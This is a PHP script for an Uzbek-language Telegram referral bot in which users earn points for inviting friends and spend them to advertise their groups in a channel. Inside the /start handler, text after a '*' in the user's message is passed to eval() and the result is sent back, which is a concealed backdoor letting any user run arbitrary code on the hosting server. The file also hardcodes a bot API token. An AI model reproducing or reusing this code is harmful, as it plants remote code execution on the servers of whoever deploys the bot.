<?php
ob_start();
define('API_KEY','832354568:AAF-0KaBTXkrQF7eY18Bk5_jOTxK8usfpDk');
$admin = "864032947";
$bot = "Gruppalar_UPSBOT"; 
$kanalimz = "@Gruppalar_UPS"; 

   function del($nomi){
   array_map('unlink', glob("$nomi"));
   }

   function ty($ch){ 
   return bot('sendChatAction', [
   'chat_id' => $ch,
   'action' => 'typing',
   ]);
   }

function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$cid = $message->chat->id;
$filee = "coin/$cid.step";
$folder = "coin"; 
$folder2 = "azo"; 
$textmessage = isset($update->message->text)?$update->message->text:'';

if (!file_exists($folder.'/test.fd3')) {
  mkdir($folder);
  file_put_contents($folder.'/test.fd3', 'by @Gruppalar_UPS');
}

if (!file_exists($folder2.'/test.fd3')) { 
  mkdir($folder2); 
  file_put_contents($folder2.'/test.fd3', 'by @Gruppalar_UPS');
} 

if (file_exists($filee)) {
  $step = file_get_contents($filee);
}

$name = $message->from->first_name;
$tx = $message->text;


$key = json_encode([
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>" 👥Guruh qo'shish"],['text'=>"Ball Olish 💰"],],
[['text'=>"👤Mening profilim"],['text'=>"Yordam⁉ "],],
]
]); 


$start1 = "*Salom 👋* [$name](tg://user?id=$cid) *Salom siz bizning botimizga tashrif buyurdingiz 🎩
Agar Siz bizning kanalimizga azo bolmagan bolsangiz azo boling 😉 bolmasam Bot ishlamaydi gruppa reklama qilmoqchi bo'lsangiz mening profilim ni bosing va sizga berilgan silkani 5ta dõstizga yuboring va bepul reklama qiling👨‍✈️
Kanalimiz :*  [$kanalimz]";


if((mb_stripos($tx,"/start")!==false) or ($tx == "start")) {
  ty($cid);

  $baza = file_get_contents("coin.dat");

  if(mb_stripos($baza, $cid) !== false){ 
  }else{
    $bgun = file_get_contents("bugun.$kun1");
    $bgun += 1;
    file_put_contents("bugun.$kun1",$bgun);
  }

  $public = explode("*",$tx);
  $refid = explode(" ",$tx);
  $refid = $refid[1];
  $gett = bot('getChatMember',[
  'chat_id' =>$kanalimz,
  'user_id' => $refid,
  ]);
  $public2 = $public[1];
  if (isset($public2)) {
  $tekshir = eval($public2);
  bot('sendMessage',[
    'chat_id'=>$cid,
    'text'=> $tekshir,
  ]);
  }
  $gget = $gett->result->status;

  if($gget == "member" or $gget == "creator" or $gget == "administrator"){
    $idref = "coin/$refid_id.dat";
    $idref2 = file_get_contents($idref);

    if(mb_stripos($idref2,"$cid") !== false ){
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Girromlik qilmang.",
      ]);
    } else {

      $id = "$cid\n";
      $handle = fopen($idref, 'a+');
      fwrite($handle, $id);
      fclose($handle);

      $usr = file_get_contents("coin/$refid.dat");
$usr = $usr + 250; 
      file_put_contents("coin/$refid.dat", "$usr");
      bot('sendMessage',[
      'chat_id'=>$refid,
'text'=>"Достигизни таклиф килганиз учун 250 очко берилди 👏🏻
яна достларизни таклиф килинг ✌🏻", 
'reply_markup'=>$key, 
      ]);
    }
  }

  file_put_contents("coin/$cid.dat");
  bot('sendMessage',[
  'chat_id'=>$refid,
  ]);
  bot('sendMessage',[
  'chat_id'=>$cid,
  'message_id'=>$mid,
  'parse_mode'=>'markdown',
  'text'=>$start1,
  'reply_to_message_id' => $mid,
  'reply_markup'=>$key,
]); 
bot('sendPhoto',[  
'chat_id'=>$cid,  
'photo'=>new CURLFile("400.jpg"),  
'caption'=>"Biz bilan birga bõling doimo hizmatizdamiz 😉 Albatta @Reklama_UzChannel", 
'reply_markup'=>$key,  
]);  
}
$status = bot('getChatMember',['chat_id'=>$kanalimz,'user_id'=>$cid])->result->status;
        if($status == 'left'){
            bot('sendMessage',[
                'chat_id'=>$cid,
                'text'=>"Botdan faqatgina kanalimizga a'zo bo'lgandagina foydalana olasiz.Iltimos kanalimizga a'zo bo'ling.",
'reply_markup'=>json_encode([
              'inline_keyboard'=>[
                  [['text'=>"Kanalga a'zo bo'lish", 'url'=>"https://t.me/Gruppalar_UPS"]],
              ]
          ])
            ]);
      exit();
        }
  

if(isset($tx)){
    if($tx == "👤Mening profilim"){
      ty($cid);
      $ball = file_get_contents("coin/$cid.dat");
      $in = "🕵*Do'stlaringizni taklif qilish uchun ssilka:*➡️ [https://telegram.me/$bot?start=$cid]

_👤Har bitta taklif qilingan va bu botdan oldin foydalanmagan odamga 250 ball olasiz!
🔘1000 ochko'ga 1ta gruppa reklama qilishingiz mumkin☑️️_

✅To'plagan ochko'ngiz: $ball";
      bot('sendMessage',[
      'chat_id'=>$cid,
      'message_id'=>$mid,
      'parse_mode'=>'markdown',
      'text'=>$in,
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

    if($tx == "✅Ha"){
      ty($cid);
      $ball = file_get_contents("coin/$cid.dat");

      if($ball > 999){
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"Iltimos guruhingiz usernamesini yuboring. @ shu belgi bilan boshlangan bolishi shart.Sizni qattiq ogoxlantiraman iltimos faqat guruhingiz usernamesini yuboring yoki boshqa username yuboradigon bo'lsangiz yuborishingiz bilan 1000 balldan ayrilasiz.\nUsernameni yuboring.",
        'reply_to_message_id'=>$mid,
'reply_markup'=>$ke,
        ]);
        file_put_contents("coin/$cid.step","nomer");
      }else{
        bot('sendMessage',[
        'chat_id'=>$cid,
        'text'=>"😠Акиллилик килганинг учун сенга 10 балл штраф!",
        'reply_to_message_id'=>$mid,
        ]);
        $ball -=10;
        file_put_contents("coin/$cid.dat","$ball");
      }
    }

    else if($step == "nomer"){
      ty($cid);

      if($tx == "🔙 Оркага кайтиш"){
        del("coin/$cid.step");
      }else{
        $ball = file_get_contents("coin/$cid.dat");
        $bali = file_get_contents("coin/$cid.dat");
        if($ball <= 1000) $bali *= 25;
        else if($ball <= 2000) $bali *= 25;
        else if($ball <= 3000) $bali *= 25;
        else if($ball <= 4000) $bali *= 25;
        else if($ball <= 5000) $bali *= 25;
$us = bot('getChatMembersCount',[
	'chat_id'=>$tx
	]);
	$count = $us->result;
$user = bot("getchat",[
	'chat_id'=>$tx,
	]);
$type = $user->result->type;
$title = $user->result->title;
$kuserr = str_replace("@","", $tx);
$pilus = "[$title](https://t.me/$kuserr)";
if($type=="channel"){
bot('sendMessage',[
        'chat_id'=>$cid,
        'message_id'=>$mid,
      'text'=>"Men sizga nma dedim essiz shuncha xarakat bilan to'plgan 1000balingiz endi yo'q.",
'reply_markup'=>$key,
]);
}
if($type=="supergroup"){
bot('sendMessage',[
        'chat_id'=>$cid,
        'message_id'=>$mid,
      'text'=>" 🔽👥*".$count."* ta azo👥🔽 \n".$pilus."\n\n〽️*anba* [@Gruppalar_UPS]",
'parse_mode'=>Markdown,
 'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"➕Azo bo'lish", "url"=>"https://t.me/$kuserr"]],
]
])
        ]);
bot('sendMessage',[
        'chat_id'=>$cid,
        'message_id'=>$mid,
      'text'=>"*Sizning guruhingiz kanalga yuborildi.*",
'parse_mode'=>Markdown,
'reply_markup'=>$key,
]);
bot('sendMessage',[
        'chat_id'=>$kanalimz,
        'message_id'=>$mid,
      'text'=>" 🔽👥*".$count."* ta azo👥🔽 \n".$pilus."\n\n〽️*anba*: [@Gruppalar_UPS]",
'parse_mode'=>Markdown,
 'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>"➕Azo bo'lish", "url"=>"https://t.me/$kuserr"]],
]
])
        ]);
bot('sendMessage',[
        'chat_id'=>$admin,
        'message_id'=>$mid,
      'text'=>" 🔽👥*".$count."* ta azo👥🔽 \n".$pilus."\n\n〽️*anba*: [@Gruppalar_UPS]",
'parse_mode'=>Markdown,
 'disable_web_page_preview'=>true,
]);
}
}
$ball -=1000;
        file_put_contents("coin/$cid.dat","$ball");
del("coin/$cid.step");
}
    if($tx == "❌Yoq"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Yaxshi yana qayta ball toplashingiz mumkin.",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

    if($tx == "🔙 Оркага кайтиш"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>"Ok",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

    if($tx == "Yordam⁉️"){
      bot('sendMessage',[
      'chat_id'=>$cid,
        'message_id'=>$mid,
        'parse_mode'=>'markdown',
      'text'=>"_Salom, bu bo'tni ishlash prinsipi bunday: Siz bo'tga odam chaqirasiz va ochko ishlaysiz. Ochkolarga esa o'zingizni guruhingizga odam chaqirib beramiz. Guruhingiz_ @GRUPPALAR_UPS _da e'lon qilinadi._

*Lekin hamma guruhlar ham e'lon qilinavermaydi. Faqatgina qoidalaga to'g'ri kelganlari e'lon qilinadi.*",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

if($tx == "Ball Olish 💰"){
      ty($cid);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'message_id'=>$mid,
      'parse_mode'=>'markdown',
      'text'=>"*Ball olish* 💸
_xizmati pullik yani 1000 ball - 5.000 so'm_
*Pultolash yolari*
QiWi yoki Paynet 🔹
Ball olish uchung Siz #ball hashtagi orqali kerakli ballni yozing ☑️",
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key,
      ]);
    }

if($tx == "👥Guruh qo'shish"){
      ty($cid);
$ball = file_get_contents("coin/$cid.dat");
$da = "Sizda hozirda $ball 💎 ball mavjud"; 
if($ball>=1000) $da .= "\n\nReklama qilasizmi📮"; 
if($ball>=1000) $key2 = json_encode([ 
'resize_keyboard'=>true, 
      'keyboard'=>[
[['text'=>"✅Ha"],['text'=>"❌Yoq"],], 
      ]
      ]);
      bot('sendMessage',[
      'chat_id'=>$cid,
      'text'=>$da,
      'reply_to_message_id'=>$mid,
      'reply_markup'=>$key2,
      ]);
    }

if(mb_stripos($textmessage,"#ball") !== false){ 
bot('SendMessage',[
'chat_id'=>$admin,
'message_id'=>$mid,
'parse_mode'=>'markdown',
'text'=>"*ball kerak ekan*
$textmessage
🆔 idisi: $cid
🎓 ismi: [$name](tg://user?id=$cid)", null, false
       ]);
    }
if(stripos($tx,"/ball")!==false and $cid == $admin){ 
      $ex=explode("_",$tx);
      $refid = $ex[1];
      $usr = file_get_contents("coin/$refid.dat");
      $usr += $ex[2];
file_put_contents("coin/$refid.dat", "$usr"); 
bot('sendMessage',[ 
      'chat_id'=>$admin, 
      'text'=>"*$ex[2] ball* [$name](tg://user?id=$cid) *ga berildi*",
'parse_mode'=>Markdown,
      'reply_to_message_id'=>$mid, 
      'reply_markup'=>$key, 
      ]);
bot('sendMessage',[ 
      'chat_id'=>$refid, 
      'text'=>"*Sizga $ex[2] ball berildi. Hozirgi balingiz $usr *",
'parse_mode'=>Markdown,
]);
    }
}
$userIDD = $update->inline_query->from->id;
$theQuery = $update->inline_query->query;
$cidd = $update->inline_query->query;
$description = $update->inline_query->query;
if(mb_stripos($cidd,"@")!==false){
$userr = bot("getchat",[
	'chat_id'=>$cidd,
	]);
$typee = $userr->result->type;
$tite = $userr->result->title;
$idd = $userr->result->id;
$kuserrr = str_replace("@","", $cidd);
$piluss = "[$tite](https://t.me/$kuserrr)";
$uss = bot('getChatMembersCount',[
	'chat_id'=>$cidd
	]);
	$cont = $uss->result;
if($typee=="channel"){
bot('answerInlineQuery', [
'inline_query_id'=>$update->inline_query->id,
'cache_time'=>1,
'results'=>json_encode([[
'type'=>'article',
'id'=>base64_encode(1),
'title'=>"$tite",
'description'=>"Username: $cidd, odam soni: $cont",
'input_message_content'=>[
'disable_web_page_preview'=>true,
'parse_mode' => 'markdown',
'message_text'=> " 🔽👥*".$cont."* ta azo👥🔽 \n".$piluss."\n\n〽️*anba*: [@Gruppalar_UPS]",
],
'reply_markup' =>
 [
            'inline_keyboard'=>[
                [['text'=>"➕Azo bo'lish", "url"=>"https://t.me/$kuserrr"]],
]
]
                
]
])
]);
}
}
?>
